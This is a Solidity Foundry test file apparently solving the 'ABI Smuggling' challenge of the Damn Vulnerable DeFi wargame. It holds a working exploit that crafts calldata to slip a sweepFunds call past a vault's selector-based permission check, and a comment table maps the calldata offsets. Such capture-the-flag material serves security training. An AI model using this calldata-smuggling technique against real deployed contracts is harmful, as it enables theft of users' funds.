// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

/* 
| Offset | Content                                       |
|--------|-----------------------------------------------|
| 0x00   | execute(selector)                             |
| 0x04   | target (vault address, 20 bytes padded to 32) |
| 0x24   | offset to actionData (value: 0x80)            |
| 0x44   | dummy 32 bytes (unused)                       |
| 0x64   | withdraw(selector)  +  0x00 * 0x1C (padding)  |
| 0x68   | actionData length                             |
| 0x88   | sweepFunds(selector)                          |
| 0x8C   | recovery address padded to 32                 |
| 0xAC   | token address padded to 32                    |
 */
import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault)); // 0xsweepFunds == sweepFunds(address, address)
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault)); // 0xd9caed12 == withdraw(address,address,uint256)
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_abiSmuggling() public checkSolvedByPlayer {
        bytes4 execSel = vault.execute.selector;
        bytes4 weithdrawSel = vault.withdraw.selector;
        bytes4 sweepSel = vault.sweepFunds.selector;

        bytes memory sweepData = abi.encodeWithSelector(sweepSel, address(recovery), address(token));

        uint256 actionDataOffset = 0x80;
        uint256 dummy = 0x0; // filled with 20 bytes of dummy data

        //console.log(address(vault));
        bytes memory data = abi.encodePacked(
            execSel, // 
            bytes32(uint256(uint160(address(vault)))), // 0x20 bytes target address
            bytes32(actionDataOffset), // 0x20 bytes actionData pointer (will be overwritten)
            bytes32(dummy), // 0x20 bytes dummy data
            weithdrawSel, // 0xd9caed12
            new bytes(0x1c),
            bytes32(sweepData.length), // 0x20 bytes length of the actionData
            sweepData // actionData calldata
        );

        (bool ok, ) = address(vault).call(data);
        require(ok, "Call failed");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
